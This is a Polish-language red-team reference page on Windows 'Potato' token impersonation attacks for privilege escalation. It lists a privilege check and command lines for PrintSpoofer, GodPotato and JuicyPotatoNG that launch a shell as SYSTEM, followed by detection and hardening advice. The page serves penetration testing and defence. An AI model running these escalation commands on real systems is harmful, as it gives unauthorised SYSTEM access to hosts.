---
title: "Token Impersonation (Potato)"
category: "red-team"
tags: ["privesc", "windows", "tokens"]
platform: "windows"
mitre: ["T1134.001"]
difficulty: "advanced"
updated: "2026-07-11"
author: "core"
---

# Token Impersonation (Potato attacks)

## TL;DR
Konto usługowe z `SeImpersonatePrivilege` (np. IIS, MSSQL) może wymusić uwierzytelnienie SYSTEM i podszyć się pod jego token → eskalacja do SYSTEM.

## Warunek
```powershell
whoami /priv | findstr /i "SeImpersonate SeAssignPrimaryToken"
```

## Narzędzia (wybór wg wersji/kontekstu)
```powershell
# PrintSpoofer – gdy działa spooler / named pipe
.\PrintSpoofer64.exe -i -c cmd

# GodPotato – nowoczesny, szeroka kompatybilność (.NET)
.\GodPotato-NET4.exe -cmd "cmd /c whoami"

# JuicyPotatoNG – DCOM/OXID
.\JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a "/c whoami"
```

## Jak to działa (skrót)
1. Wymuszenie uwierzytelnienia SYSTEM (RPC/DCOM/named pipe).
2. Przechwycenie i impersonacja tokenu SYSTEM (`SeImpersonatePrivilege`).
3. Uruchomienie procesu w kontekście SYSTEM.

## Wykrywanie (Blue Team)
- Named pipe impersonation, proces potomny konta usługowego działający jako SYSTEM.
- Sysmon Event 1 z nietypowym parent→child (`w3wp.exe` → `cmd.exe` jako SYSTEM).
- Anomalie DCOM/OXID resolver.

## Mitygacja / Hardening
- Odbierz `SeImpersonatePrivilege` tam, gdzie zbędne (uważnie — usługi go wymagają).
- Patching (część wektorów łatana), wyłącz nieużywany Spooler.
- Segreguj konta usługowe, gMSA, monitoring EDR.

## Źródła
- [GodPotato](https://github.com/BeichenDream/GodPotato)
- [MITRE T1134.001](https://attack.mitre.org/techniques/T1134/001/)
